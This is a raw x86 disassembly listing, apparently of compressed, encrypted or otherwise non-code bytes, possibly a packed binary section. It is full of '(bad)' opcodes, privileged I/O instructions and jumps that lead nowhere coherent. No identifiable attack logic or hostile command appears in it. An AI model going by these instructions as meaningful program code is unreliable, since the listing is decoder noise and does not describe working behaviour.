  41e73a:	lahf   
  41e73b:	push   edi
  41e73c:	pop    eax
  41e73d:	inc    ecx
  41e73e:	scas   al,BYTE PTR es:[edi]
  41e73f:	mov    dh,0x2a
  41e741:	enter  0x8ac8,0x7a
  41e745:	jp     0x41e782
  41e747:	or     esi,DWORD PTR [edi]
  41e749:	push   0x1278af13
  41e74e:	jge    0x41e6d1
  41e750:	pop    ebx
  41e751:	int    0x18
  41e753:	sub    DWORD PTR ds:0xf93b7532,ebx
  41e759:	out    dx,eax
  41e75a:	outs   dx,DWORD PTR ds:[esi]
  41e75b:	stos   BYTE PTR es:[edi],al
  41e75c:	or     dh,BYTE PTR [eax-0x70]
  41e75f:	push   edi
  41e760:	dec    ebx
  41e761:	pop    esp
  41e762:	rol    BYTE PTR [eax],0xbf
  41e765:	aaa    
  41e766:	pushf  
  41e767:	ins    BYTE PTR es:[edi],dx
  41e768:	xchg   DWORD PTR [eax+0x1d],ebx
  41e76b:	mov    eax,ds:0x8e0c4b29
  41e770:	shl    DWORD PTR [ebx+0x5a],1
  41e773:	daa    
  41e774:	in     eax,0x86
  41e776:	out    0x2e,eax
  41e778:	cld    
  41e779:	xchg   BYTE PTR [edx+eax*8+0x726a5310],dl
  41e780:	mov    ds:0xb16cdb48,al
  41e785:	inc    esp
  41e786:	icebp  
  41e787:	jecxz  0x41e770
  41e789:	and    BYTE PTR [ebx],dl
  41e78b:	sbb    al,0xab
  41e78d:	ss pop ecx
  41e78f:	mov    esp,DWORD PTR [edi+0x2]
  41e792:	fld    TBYTE PTR [eax]
  41e794:	xchg   ecx,eax
  41e795:	sbb    bl,0xb6
  41e798:	scas   eax,DWORD PTR es:[edi]
  41e799:	xchg   edi,eax
  41e79a:	in     eax,0xdb
  41e79c:	pop    ebp
  41e79d:	xor    BYTE PTR [esp+ecx*4-0x64dd58b8],0xa2
  41e7a5:	leave  
  41e7a6:	(bad)  
  41e7a7:	aas    
  41e7a8:	lock sar DWORD PTR [esi-0x246bf5fb],0x37
  41e7b0:	push   ecx
  41e7b1:	shl    DWORD PTR [ebp+0x2846bdab],1
  41e7b7:	(bad)  
  41e7b8:	(bad)  
  41e7b9:	cmc    
  41e7ba:	ficomp DWORD PTR [edi+0x6e92ba7]
  41e7c0:	ret    
  41e7c1:	dec    edi
  41e7c2:	add    DWORD PTR [eax+0x1a537aed],0xffffffad
  41e7c9:	rol    BYTE PTR [ebp+0x25205682],cl
  41e7cf:	pushf  
  41e7d0:	mov    bh,0x2c
  41e7d2:	out    0x1,eax
  41e7d4:	pop    ebp
  41e7d5:	cdq    
  41e7d6:	mov    esi,0x7dec4a
  41e7db:	cli    
  41e7dc:	sub    ebp,DWORD PTR [ebx-0x58]
  41e7df:	jg     0x41e795
  41e7e1:	ror    bl,1
  41e7e3:	push   eax
  41e7e4:	hlt    
  41e7e5:	mov    al,0xb0
  41e7e7:	fadd   QWORD PTR [ebx-0x7cf6c07a]
  41e7ed:	out    dx,eax
  41e7ee:	clc    
  41e7ef:	pop    ss
  41e7f0:	cwde   
  41e7f1:	push   es
  41e7f2:	lock pop es
  41e7f4:	inc    esp
  41e7f5:	nop
  41e7f6:	mov    bh,ah
  41e7f8:	push   edi
  41e7f9:	jae    0x41e879
  41e7fb:	in     eax,dx
  41e7fc:	dec    ebp
  41e7fd:	js     0x41e7b8
  41e7ff:	mov    ch,0x6
  41e801:	cmp    al,0x38
  41e803:	xchg   edi,eax
  41e805:	or     eax,0x32759a64
  41e80a:	ss pop ebx
  41e80c:	cmp    eax,DWORD PTR [esi]
  41e80e:	xchg   edi,eax
  41e80f:	clc    
  41e810:	mov    ch,0xe0
  41e812:	test   DWORD PTR [esi-0x4538ebfb],0x526a9994
  41e81c:	sahf   
  41e81d:	lods   eax,DWORD PTR ds:[esi]
  41e81e:	or     al,0x8a
  41e820:	lock cwde 
  41e822:	leave  
  41e823:	push   cs
  41e824:	jo     0x41e88b
  41e826:	jmp    0x3e0b:0x70a3676e
  41e82d:	push   esi
  41e82e:	sbb    al,0x5
  41e830:	mov    edi,0xd7d3e5b6
  41e835:	adc    cl,BYTE PTR [edi-0x59c6c705]
  41e83b:	std    
  41e83c:	sar    BYTE PTR [ebp-0x25],0xf5
  41e840:	mov    ebp,0x4bbb48f9
  41e845:	lods   eax,DWORD PTR ds:[esi]
  41e846:	pop    ss
  41e847:	addr16 xchg ebx,eax
  41e849:	pop    es
  41e84a:	push   edi
  41e84b:	xor    eax,ebx
  41e84d:	dec    edx
  41e84e:	in     eax,0xb1
  41e850:	ins    DWORD PTR es:[edi],dx
  41e851:	sbb    bl,BYTE PTR [esi]
  41e853:	mov    es,WORD PTR [esp+eax*4-0x51]
  41e857:	mov    bh,0x2a
  41e859:	stos   BYTE PTR es:[edi],al
  41e85a:	loopne 0x41e88d
  41e85c:	test   al,0x54
  41e85e:	cli    
  41e85f:	pop    ss
  41e860:	mov    edx,0x8b37fbab
  41e865:	add    ebx,DWORD PTR [ebp+0x2753655a]
  41e86b:	enter  0xe441,0x22
  41e86f:	jb     0x41e87c
  41e871:	das    
  41e872:	jp     0x41e7f9
  41e874:	(bad)  
  41e875:	(bad)  
  41e876:	sbb    BYTE PTR [edi+0x24d3d8c6],al
  41e87c:	sbb    WORD PTR gs:[edx+0x787c5b38],dx
  41e884:	mov    ch,0x2c
  41e886:	inc    esi
  41e887:	push   esp
  41e888:	scas   eax,DWORD PTR es:[edi]
  41e889:	push   edx
  41e88a:	or     esi,DWORD PTR [ebp-0x3]
  41e88d:	clc    
  41e88e:	bound  eax,QWORD PTR [ebx]
  41e890:	and    eax,DWORD PTR [edx+0x198bd9b8]
  41e896:	dec    ecx
  41e897:	pop    ebp
  41e898:	sbb    al,0xcd
  41e89b:	push   eax
  41e89c:	dec    edx
  41e89d:	test   dh,bl
  41e89f:	jo     0x41e845
  41e8a1:	cmp    DWORD PTR [ebp+0x4],esp
  41e8a4:	(bad)  
  41e8a5:	hlt    
  41e8a6:	pop    ebp
  41e8a7:	das    
  41e8a8:	div    DWORD PTR ds:0x236575ba
  41e8ae:	push   es
  41e8af:	pop    edx
  41e8b0:	imul   edi,DWORD PTR [esi],0x7e
  41e8b3:	stc    
  41e8b4:	pop    edx
  41e8b5:	cmp    BYTE PTR [esi-0x5855d6d9],0xea
  41e8bc:	mov    esi,0xcefdd47b
  41e8c1:	ds aas 
  41e8c3:	mov    WORD PTR [ebx],?
  41e8c5:	mov    eax,ds:0x83d610bd
  41e8ca:	aas    
  41e8cb:	lahf   
  41e8cc:	out    0x3a,al
  41e8ce:	test   eax,0x2d398259
  41e8d3:	lods   al,BYTE PTR ds:[esi]
  41e8d4:	lods   al,BYTE PTR ds:[esi]
  41e8d5:	push   esp
  41e8d6:	pop    ecx
  41e8d7:	das    
  41e8d8:	or     eax,0xc3b64085
  41e8dd:	rcr    ebp,1
  41e8df:	dec    ebp
  41e8e0:	or     DWORD PTR [ebp-0x8],0xffffffeb
  41e8e4:	xor    DWORD PTR [edx],edi
  41e8e6:	rcl    BYTE PTR [ecx],cl
  41e8e8:	mov    esp,0xcf50bbef
  41e8ed:	dec    ebx
  41e8ef:	xchg   esi,eax
  41e8f0:	jnp    0x41e887
  41e8f2:	mov    esp,0x4efba8ec
  41e8f7:	add    ebx,edi
  41e8f9:	idiv   dh
  41e8fb:	outs   dx,BYTE PTR ds:[esi]
  41e8fc:	(bad)  
  41e8fe:	ret    0xf72a
  41e901:	push   0x7793e0f4
  41e906:	push   edx
  41e907:	loop   0x41e919
  41e909:	mov    ah,0x27
  41e90b:	ja     0x41e8e3
  41e90d:	stc    
  41e90e:	or     DWORD PTR [ebx],0xffffff97
  41e911:	or     BYTE PTR [esi],ch
  41e913:	(bad)  
  41e915:	xor    eax,0x68edef76
  41e91a:	js     0x41e902
  41e91c:	mov    dl,0x5b
  41e91e:	in     eax,dx
  41e91f:	lods   eax,DWORD PTR ds:[esi]
  41e920:	sbb    al,0x5b
  41e922:	add    DWORD PTR [edx+0x67],ebp
  41e925:	shl    ah,1
  41e927:	dec    bl
  41e929:	mov    fs,edi
  41e92b:	adc    DWORD PTR [esi+0x7d5e976e],ecx
  41e931:	jns    0x41e921
  41e933:	xor    eax,0x80c97f07
  41e938:	jns    0x41e944
  41e93a:	push   edi
  41e93b:	pusha  
  41e93c:	xchg   edx,eax
  41e93d:	and    BYTE PTR [ebx+0x15b5d170],al
  41e943:	call   ebp
  41e945:	adc    al,0x2d
  41e947:	les    edx,FWORD PTR [edi]
  41e949:	pop    eax
  41e94a:	adc    BYTE PTR [ebx-0x34],ch
  41e94d:	jle    0x41e985
  41e94f:	pop    esp
  41e950:	gs es hlt 
  41e953:	adc    edx,esi
  41e955:	sub    dl,cl
  41e957:	add    ecx,DWORD PTR [ecx-0x74d04c6]
  41e95d:	in     eax,0xff
  41e95f:	pop    edx
  41e960:	aad    0xb9
  41e962:	dec    ebx
  41e963:	sub    al,0xf2
  41e965:	push   cs
  41e966:	push   cs
  41e967:	jge    0x41e996
  41e969:	(bad)
  41e96d:	adc    eax,DWORD PTR [edx+0xad3413c]
  41e973:	mov    cl,0x1a
  41e975:	es pop ecx
  41e977:	pop    ds
  41e978:	xor    eax,0x333f8ec1
  41e97d:	jle    0x41e975
  41e97f:	jmp    0x41e9d3
  41e981:	sub    ebp,DWORD PTR [ebp+edx*2-0x6e]
  41e985:	and    dh,bh
  41e987:	xchg   edi,ecx
  41e989:	pop    esp
  41e98a:	psrlw  mm4,mm6
  41e98d:	dec    esi
  41e98e:	mov    cl,0x85
  41e990:	and    eax,0x423221e3
  41e995:	inc    esi
  41e996:	pop    ecx
  41e997:	dec    esi
  41e998:	jb     0x41e9a2
  41e99a:	repnz pusha 
  41e99c:	xchg   ebx,eax
  41e99d:	mov    cl,0xe7
  41e99f:	mov    edi,DWORD PTR [bp+di]
  41e9a2:	push   esp
  41e9a3:	icebp  
  41e9a4:	sub    dl,BYTE PTR ds:0xc8246b51
  41e9aa:	jecxz  0x41e93c
  41e9ac:	stos   DWORD PTR es:[edi],eax
  41e9ad:	popa   
  41e9ae:	out    dx,al
  41e9af:	shr    DWORD PTR ds:0x4f8baa40,1
  41e9b5:	inc    eax
  41e9b6:	ins    BYTE PTR es:[edi],dx
  41e9b7:	outs   dx,DWORD PTR ds:[esi]
  41e9b8:	(bad)  
  41e9b9:	lock add cl,0x77
  41e9bd:	sub    eax,0x1435efc6
  41e9c2:	cwde   
  41e9c3:	fwait
  41e9c4:	das    
  41e9c5:	hlt    
  41e9c6:	sbb    ecx,DWORD PTR [edx]
  41e9c8:	jle    0x41e9f8
  41e9ca:	test   eax,0x24c3e88a
  41e9cf:	sar    DWORD PTR [ebx+0x53881e31],cl
  41e9d5:	jp     0x41e9d1
  41e9d7:	sbb    DWORD PTR [ebx-0x1541f336],esp
  41e9dd:	fidiv  WORD PTR [edx]
  41e9df:	push   edi
  41e9e0:	jns    0x41e9e6
  41e9e2:	mov    DWORD PTR [eax-0xb],ebp
  41e9e5:	and    edi,ecx
  41e9e7:	jbe    0x41e9fe
  41e9e9:	dec    esi
  41e9ea:	sbb    al,0xda
  41e9ec:	imul   eax,DWORD PTR [eax-0x23],0xc2589276
  41e9f3:	lea    edx,[edx+0x5a]
  41e9f6:	sbb    BYTE PTR [edx],0x39
  41e9f9:	out    dx,eax
  41e9fa:	fild   QWORD PTR [edi]
  41e9fd:	add    esp,DWORD PTR [ebp+ebp*2-0x6762d0bc]
  41ea04:	pop    esp
  41ea05:	lds    ecx,FWORD PTR [eax+0xf]
  41ea08:	out    0x8,al
  41ea0a:	in     al,0xcd
  41ea0c:	push   cs
  41ea0d:	loope  0x41e9da
  41ea0f:	scas   eax,DWORD PTR es:[edi]
  41ea10:	enter  0x42cb,0xca
  41ea14:	pushf  
  41ea15:	jmp    0x41e99a
  41ea17:	mov    esi,0xa0e47f64
  41ea1c:	in     eax,dx
  41ea1d:	push   ss
  41ea1e:	sub    edx,0x33
  41ea21:	cmp    edx,DWORD PTR [edi]
  41ea23:	mov    edx,DWORD PTR [edi-0x37]
  41ea26:	dec    eax
  41ea27:	fnsave [edi+0x7e8ac87a]
  41ea2d:	rcr    DWORD PTR [eax+0x4a3820ea],0xc6
  41ea34:	or     al,0xd6
  41ea36:	push   ebp
  41ea37:	cmp    al,0x1f
  41ea39:	lds    ebx,FWORD PTR [edx]
  41ea3b:	hlt    
  41ea3c:	sub    esi,DWORD PTR [edi+0x23]
  41ea3f:	dec    edi
  41ea40:	inc    ecx
  41ea41:	mov    WORD PTR [edi+0x13],cs
  41ea44:	push   0x15a019f7
  41ea49:	adc    al,0x5
  41ea4b:	loopne 0x41ea72
  41ea4d:	bnd ja 0x41ea9b
  41ea50:	mov    ebx,0x12046fc7
  41ea55:	fwait
  41ea56:	xchg   esi,eax
  41ea57:	loopne 0x41eab3
  41ea59:	imul   ebp,DWORD PTR [eax+0x66],0x8942d9a9
  41ea60:	xchg   edi,eax
  41ea61:	pop    ecx
  41ea62:	cli    
  41ea63:	pop    es
  41ea64:	ret    
  41ea65:	push   0xffffff9b
  41ea67:	cmp    esp,DWORD PTR [esi+ecx*2-0x6567d1f]
  41ea6e:	bound  edi,QWORD PTR ds:0x393123db
  41ea74:	icebp  
  41ea75:	retf   
  41ea76:	xchg   bh,dh
  41ea78:	xor    eax,0x45bc0032
  41ea7d:	ja     0x41ea20
  41ea7f:	addr16 mov ecx,0x49c6cc06
  41ea85:	push   ss
  41ea86:	xlat   BYTE PTR ds:[ebx]
  41ea87:	and    eax,0xda259ab
  41ea8c:	inc    eax
  41ea8d:	xor    ecx,DWORD PTR [ebp-0x38758778]
  41ea93:	dec    esi
  41ea94:	pop    es
  41ea95:	fs pop ss
  41ea97:	fidivr DWORD PTR [esi-0x7e]
  41ea9a:	aaa    
  41ea9b:	push   ds
  41ea9c:	iret   
  41ea9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea9e:	xchg   esi,eax
  41ea9f:	xor    al,0x4a
  41eaa1:	sbb    eax,0x97753179
  41eaa6:	jnp    0x41eac6
  41eaa8:	sbb    eax,0xb8096b9
  41eaad:	repnz ror DWORD PTR [ebx+0x52],0x77
  41eab2:	xchg   ecx,eax
  41eab3:	(bad)  
  41eab5:	ins    BYTE PTR es:[edi],dx
  41eab6:	outs   dx,BYTE PTR ds:[esi]
  41eab7:	push   0x54
  41eab9:	sbb    DWORD PTR [ebx],edx
  41eabb:	dec    edx
  41eabc:	inc    edi
  41eabd:	test   DWORD PTR [edi-0x24],edx
  41eac0:	mov    eax,0xfde7fcbf
  41eac5:	cmc    
  41eac6:	cmp    bh,dl
  41eac8:	in     eax,dx
  41eac9:	push   ds
  41eaca:	mov    esi,0xbfda6ce3
  41eacf:	xor    al,0x13
  41ead1:	jl     0x41eb37
  41ead3:	mov    esp,ebp
  41ead5:	xchg   BYTE PTR [esi-0x35],ch
  41ead8:	jmp    0xa471bc22
  41eadd:	push   ecx
  41eade:	aam    0x0
  41eae0:	mov    dl,0xf8
  41eae2:	fisttp QWORD PTR [ebx+0x13]
  41eae5:	sbb    BYTE PTR [ecx-0x2709537f],ah
  41eaeb:	jns    0x41ea9c
  41eaed:	or     BYTE PTR [edi],al
  41eaef:	and    eax,0x2a8fdad0
  41eaf4:	lods   al,BYTE PTR ds:[esi]
  41eaf5:	ror    bh,cl
  41eaf7:	add    bh,al
  41eaf9:	dec    esi
  41eafa:	cld    
  41eafb:	cmp    eax,0xd17caf04
  41eb00:	scas   al,BYTE PTR es:[edi]
  41eb01:	lds    esi,FWORD PTR [edx]
  41eb03:	(bad)  
  41eb05:	jmp    0xbed180fd
  41eb0a:	fs push 0x17845bf2
  41eb10:	sub    al,0x1b
  41eb12:	ja     0x41eadf
  41eb14:	in     al,dx
  41eb15:	repnz aam 0xf8
  41eb18:	add    eax,eax
  41eb1a:	jl     0x41eaed
  41eb1c:	add    DWORD PTR [ebx],ecx
  41eb1e:	inc    edx
  41eb1f:	hlt    
  41eb20:	push   ds
  41eb21:	ins    BYTE PTR es:[edi],dx
  41eb22:	div    DWORD PTR [ebp+0x773787c3]
  41eb28:	mov    bh,0xd9
  41eb2a:	icebp  
  41eb2b:	loopne 0x41eb62
  41eb2d:	(bad)  
  41eb2f:	or     bl,cl
  41eb31:	popf   
  41eb32:	push   edx
  41eb33:	int3   
  41eb34:	stos   DWORD PTR es:[edi],eax
  41eb35:	push   ebx
  41eb36:	fistp  WORD PTR [ebp+eiz*1+0x2b7864d0]
  41eb3d:	and    ah,ch
  41eb3f:	adc    ax,0x88b2
  41eb43:	and    BYTE PTR [ecx+0x637803db],dh
  41eb49:	lock pop esi
  41eb4b:	mov    cl,0x57
  41eb4d:	pushf  
  41eb4e:	cmp    cl,BYTE PTR [edi+edi*8]
  41eb51:	adc    ah,al
  41eb53:	mov    al,0xba
  41eb55:	rcl    BYTE PTR [edx+0xf24623b],1
  41eb5b:	enter  0xcbfb,0x4a
  41eb5f:	xor    al,0x1e
  41eb61:	add    DWORD PTR [edi+edi*2-0x33e4f1e3],0x9c474000
  41eb6c:	jne    0x41eb2d
  41eb6e:	add    DWORD PTR [edi],ebp
  41eb70:	cs js  0x41ebd4
  41eb73:	pop    ss
  41eb74:	cmp    al,0xfd
  41eb76:	test   DWORD PTR [esi-0x48],edi
  41eb79:	(bad)  
  41eb7a:	jg     0x41eb8a
  41eb7c:	jp     0x41eb95
  41eb7e:	ins    BYTE PTR es:[edi],dx
  41eb7f:	add    BYTE PTR [eax+edi*2],al
  41eb82:	mov    eax,DWORD PTR [edi]
  41eb84:	shl    BYTE PTR [ecx-0x5e],cl
  41eb87:	sub    DWORD PTR [eax+0x21],esi
  41eb8a:	adc    bl,BYTE PTR [edx+0x6c]
  41eb8d:	in     eax,0xc3
  41eb8f:	cdq    
  41eb90:	mul    DWORD PTR [eax+0x4c]
  41eb93:	ss pop esp
  41eb95:	mov    cl,0x92
  41eb97:	mov    ds:0xecc52508,eax
  41eb9c:	inc    edi
  41eb9d:	mov    al,ch
  41eb9f:	mov    esi,0xb34877a8
  41eba4:	sub    edi,edx
  41eba6:	arpl   WORD PTR [ecx],bx
  41eba8:	ret    
  41eba9:	in     al,dx
  41ebaa:	jecxz  0x41ebee
  41ebac:	clc    
  41ebad:	mov    ch,0x40
  41ebaf:	dec    eax
  41ebb0:	sbb    eax,0x602121c3
  41ebb5:	and    DWORD PTR [ecx],edi
  41ebb7:	xlat   BYTE PTR ds:[ebx]
  41ebb8:	gs add eax,0x2dddd394
  41ebbe:	mov    ch,0xe0
  41ebc0:	gs mov ecx,0x89f852d3
  41ebc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebc7:	out    0x86,eax
  41ebc9:	mov    ah,0xdd
  41ebcb:	mov    edx,0x4c0096a7
  41ebd0:	test   BYTE PTR [ecx],al
  41ebd2:	or     al,0xe
  41ebd4:	(bad)  
  41ebd5:	or     esi,DWORD PTR [ebx+edx*2+0x30]
  41ebd9:	sbb    DWORD PTR [ecx-0x23],esp
  41ebdc:	or     DWORD PTR [eax+0x7c],ecx
  41ebdf:	sar    DWORD PTR [esi+0x4d9587da],cl
  41ebe5:	arpl   WORD PTR [esi+0x27ac133e],bp
  41ebeb:	mov    ds:0xc51234a5,eax
  41ebf0:	clc    
  41ebf1:	mov    es,WORD PTR [ecx+0x51cd952b]
  41ebf7:	retf   
  41ebf8:	push   ecx
  41ebf9:	inc    edx
  41ebfa:	mov    eax,DWORD PTR [eax]
  41ebfc:	out    0x4b,al
  41ebfe:	inc    esp
  41ebff:	pop    edi
  41ec00:	sbb    eax,0x1699d1d0
  41ec05:	inc    esi
  41ec06:	dec    eax
  41ec07:	jb     0x41ebcc
  41ec09:	jmp    0xf7883b
  41ec0e:	pusha  
  41ec0f:	push   eax
  41ec10:	cmc    
  41ec11:	retf   
  41ec12:	lea    ecx,[edi-0x52]
  41ec15:	imul   edi,DWORD PTR [ebx+0x3a9a5ea7],0xffffffa7
  41ec1c:	or     al,0x3b
  41ec1e:	sbb    al,0xf0
  41ec20:	sub    eax,0x228e3e9c
  41ec25:	mov    bh,0x53
  41ec27:	ins    BYTE PTR es:[edi],dx
  41ec28:	aaa    
  41ec29:	cdq    
  41ec2a:	ror    BYTE PTR [edi+0x3b],1
  41ec2d:	push   esp
  41ec2e:	dec    ebx
  41ec2f:	(bad)  
  41ec30:	in     al,0xf5
  41ec32:	out    0x50,al
  41ec34:	in     al,0xc5
  41ec36:	sbb    ebx,ebx
  41ec38:	(bad)  
  41ec39:	jecxz  0x41ebd8
  41ec3b:	pop    edx
  41ec3c:	ret    
  41ec3d:	push   edx
  41ec3e:	(bad)  
  41ec3f:	sti    
  41ec40:	push   esi
  41ec41:	gs xchg esp,eax
  41ec43:	ret    
  41ec44:	pop    ecx
  41ec45:	test   DWORD PTR [edx],eax
  41ec47:	mov    esi,0x3505e9be
  41ec4c:	fistp  WORD PTR [ebp+0x324c542d]
  41ec52:	jecxz  0x41ec7f
  41ec54:	jnp    0x41ebdc
  41ec56:	adc    BYTE PTR [edx+0x6481dad1],dl
  41ec5c:	sar    BYTE PTR [eax-0x5a23772e],1
  41ec62:	mov    ds:0x8dc97fc9,eax
  41ec67:	enter  0x3ee5,0xc7
  41ec6b:	mov    dh,0x3a
  41ec6d:	outs   dx,BYTE PTR ds:[esi]
  41ec6e:	sbb    al,0x32
  41ec70:	mul    BYTE PTR [edx+edi*2-0xb]
  41ec74:	popf   
  41ec75:	test   BYTE PTR [ebx-0x1a],al
  41ec78:	mov    ds:0x70767392,al
  41ec7d:	dec    eax
  41ec7e:	inc    edi
  41ec7f:	icebp  
  41ec80:	mov    ebp,0x82a6eff1
  41ec85:	adc    edi,DWORD PTR [ecx+0x72]
  41ec88:	out    0x79,al
  41ec8a:	fsubr  DWORD PTR [edi+0x11ff3296]
  41ec90:	fcomp  DWORD PTR [ebx-0x39]
  41ec93:	add    al,ch
  41ec95:	retf   0xa130
  41ec98:	out    0x45,al
  41ec9a:	jns    0x41ec37
  41ec9c:	mov    ebx,0x34e8a6ae
  41eca1:	and    DWORD PTR [ebp-0xd],edx
  41eca4:	jb     0x41eca4
  41eca6:	(bad)  
  41eca7:	iret   
  41eca8:	imul   ebp,DWORD PTR [edi],0x69
  41ecab:	ss pop eax
  41ecad:	sbb    edx,DWORD PTR [edi]
  41ecaf:	mov    DWORD PTR [ebx+ebp*1+0x6],0x5394ef40
  41ecb7:	sub    ebx,esp
  41ecb9:	inc    edi
  41ecba:	and    esp,DWORD PTR [eax+0x0]
  41ecbd:	mov    edi,DWORD PTR [eax+eiz*1]
  41ecc0:	mov    ds:0x43b85299,eax
  41ecc5:	cwde   
  41ecc6:	add    DWORD PTR [eax],ebx
  41ecc8:	pusha  
  41ecc9:	(bad)  
  41ecca:	mov    ah,0xf1
  41eccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eccd:	daa    
  41ecce:	and    dl,BYTE PTR [edi-0x7c9f3b8a]
  41ecd4:	add    ebp,ebx
  41ecd6:	inc    ebx
  41ecd7:	dec    ebp
  41ecd8:	mov    dl,0x57
  41ecda:	cmp    dl,BYTE PTR [ebx-0xf]
  41ecdd:	(bad)  
  41ecde:	js     0x41ecb3
  41ece0:	inc    esi
  41ece1:	in     al,0x42
  41ece3:	push   0xaf914934
  41ece8:	sti    
  41ece9:	enter  0xbb94,0x8f
  41eced:	push   ss
  41ecee:	jl     0x41ed52
  41ecf0:	sbb    bh,BYTE PTR [eax+0x5b]
  41ecf3:	test   BYTE PTR [ebp+0x2310e8fc],ah
  41ecf9:	cmp    dl,BYTE PTR [edx]
  41ecfb:	or     al,0x97
  41ecfd:	out    0xe3,eax
  41ecff:	mov    eax,ds:0x1a68c4e9
  41ed04:	xor    al,0x8e
  41ed06:	mov    dh,0xcd
  41ed08:	mov    ds:0xae9450a3,al
  41ed0d:	mov    al,ds:0x3e744a9d
  41ed12:	pop    ecx
  41ed13:	iret   
  41ed14:	cmp    eax,0xaade2761
  41ed19:	xchg   DWORD PTR [edx-0x7b],edx
  41ed1c:	jecxz  0x41ed84
  41ed1e:	fcmovbe st,st(0)
  41ed20:	push   esi
  41ed21:	std    
  41ed22:	sub    ecx,eax
  41ed24:	std    
  41ed25:	ja     0x41ed00
  41ed27:	clc    
  41ed28:	(bad)
  41ed2b:	call   0xac3fb802
  41ed30:	aam    0x1
  41ed32:	lea    edi,[ebx-0x17]
  41ed35:	ins    BYTE PTR es:[edi],dx
  41ed36:	jo     0x41ed26
  41ed38:	inc    esp
  41ed39:	sbb    eax,0xedde155e
  41ed3e:	inc    ebx
  41ed3f:	loop   0x41edba
  41ed41:	test   eax,0x28db1ed9
  41ed46:	mov    eax,ds:0xf310e15b
  41ed4b:	and    eax,0x487cd4ea
  41ed50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed51:	mov    eax,0x3422ecdb
  41ed56:	mov    BYTE PTR [esi],bh
  41ed58:	sub    al,BYTE PTR [ecx]
  41ed5a:	out    0xf5,al
  41ed5c:	add    ebp,edx
  41ed5e:	repz mov eax,ds:0xd6addd98
  41ed64:	sar    DWORD PTR [edx-0x5b428349],0xd9
  41ed6b:	sbb    DWORD PTR [edx+0x2e8d4f79],ebx
  41ed71:	push   edx
  41ed72:	jecxz  0x41ed84
  41ed74:	dec    esp
  41ed75:	jnp    0x41ed9d
  41ed77:	sar    DWORD PTR [ebp-0x591d6aa5],0x6f
  41ed7e:	mov    bl,0x81
  41ed80:	xor    bl,bh
  41ed82:	shr    BYTE PTR [ebp-0x74],0x71
  41ed86:	xlat   BYTE PTR ds:[ebx]
  41ed87:	mov    dl,BYTE PTR [ebp+0x46]
  41ed8a:	jmp    0x41ed7e
  41ed8c:	and    edx,DWORD PTR [edi]
  41ed8e:	and    ch,BYTE PTR ds:0xe68fe09
  41ed94:	mov    ebp,0x35b16167
  41ed99:	mov    eax,eax
  41ed9b:	or     DWORD PTR [edx+ecx*2-0x3c],esp
  41ed9f:	xchg   edx,eax
  41eda0:	(bad)  
  41eda1:	repz and DWORD PTR [ebx+0x52],esp
  41eda5:	add    BYTE PTR [eax+0x78f2131b],bl
  41edab:	mov    ss,WORD PTR [ebp+eax*8-0x46565283]
  41edb2:	dec    ecx
  41edb3:	sub    eax,DWORD PTR [eax+ecx*8]
  41edb6:	dec    esi
  41edb7:	std    
  41edb8:	dec    ebx
  41edb9:	loop   0x41ee26
  41edbb:	ds sub bl,dh
  41edbe:	add    eax,0x2a113a4b
  41edc3:	mov    ds:0x23ea0b0c,eax
  41edc8:	push   es
  41edc9:	xor    eax,0xe525355d
  41edce:	dec    ecx
  41edcf:	leave  
  41edd0:	out    0x72,eax
  41edd2:	sbb    al,BYTE PTR [ecx-0x8]
  41edd5:	pop    ebx
  41edd6:	xlat   BYTE PTR ds:[ebx]
  41edd7:	adc    eax,0x84ab7c41
  41eddc:	icebp  
  41eddd:	mov    cl,0xdf
  41eddf:	sub    DWORD PTR [edi],eax
  41ede1:	mov    bl,0xb
  41ede3:	mov    edx,0x4f18cc7a
  41ede8:	dec    eax
  41ede9:	fs mov ebp,0x212f7a06
  41edef:	xor    ebp,ebp
  41edf1:	push   edx
  41edf2:	stos   BYTE PTR es:[edi],al
  41edf3:	stc    
  41edf4:	push   0xffffff8a
  41edf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edf7:	lods   al,BYTE PTR ds:[esi]
  41edf8:	in     eax,dx
  41edf9:	shr    DWORD PTR [edi],1
  41edfb:	push   cs
  41edfc:	sahf   
  41edfd:	scas   eax,DWORD PTR es:[edi]
  41edfe:	inc    edi
  41edff:	jecxz  0x41edb9
  41ee01:	data16 and BYTE PTR [ebx-0x3a738519],dh
  41ee08:	mov    al,ds:0xf8221b50
  41ee0d:	bound  esi,QWORD PTR [ecx+0x324055bb]
  41ee13:	stos   BYTE PTR es:[edi],al
  41ee14:	mov    cl,0x4b
  41ee16:	fild   WORD PTR [ecx+edx*4-0x2f]
  41ee1a:	jg     0x41ee7b
  41ee1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee1d:	cmp    al,0xbd
  41ee1f:	std    
  41ee20:	fcmovu st,st(4)
  41ee22:	and    al,0x77
  41ee24:	hlt    
  41ee25:	dec    DWORD PTR [ecx-0x521ac5b0]
  41ee2b:	push   esi
  41ee2c:	jne    0x41ee13
  41ee2e:	out    dx,al
  41ee2f:	push   cs
  41ee30:	or     bh,dh
  41ee32:	dec    esp
  41ee33:	fdivr  QWORD PTR [edi]
  41ee35:	mov    bh,0x6f
  41ee37:	hlt    
  41ee38:	fadd   QWORD PTR [ebp-0x4b]
  41ee3b:	adc    esp,ecx
  41ee3d:	add    eax,0x7add0b43
  41ee42:	aam    0xdd
  41ee44:	add    BYTE PTR [eax-0x5f8ec2a7],ch
  41ee4a:	sahf   
  41ee4b:	sbb    eax,0xe3f4746d
  41ee50:	repz pop es
  41ee52:	jmp    0x2853:0x68ef2480
  41ee59:	mov    esp,0xd0f3b551
  41ee5e:	push   ds
  41ee5f:	pop    ss
  41ee60:	pop    ebx
  41ee61:	push   edx
  41ee62:	ins    DWORD PTR es:[edi],dx
  41ee63:	mov    ds:0x21e4f9df,eax
  41ee68:	or     ecx,DWORD PTR [ecx-0xaf2c41a]
  41ee6e:	mov    ebp,0xd7b28cec
  41ee73:	(bad)  {k3}
  41ee78:	adc    eax,0xeaf4959f
  41ee7d:	pop    es
  41ee7e:	mov    edx,0x212e4ebe
  41ee83:	arpl   bx,sp
  41ee85:	mov    dh,0xc1
  41ee87:	sbb    esp,DWORD PTR [edx]
  41ee89:	adc    eax,0x16d49b1a
  41ee8e:	cmp    eax,esp
  41ee90:	sub    bl,BYTE PTR [edi]
  41ee92:	dec    esp
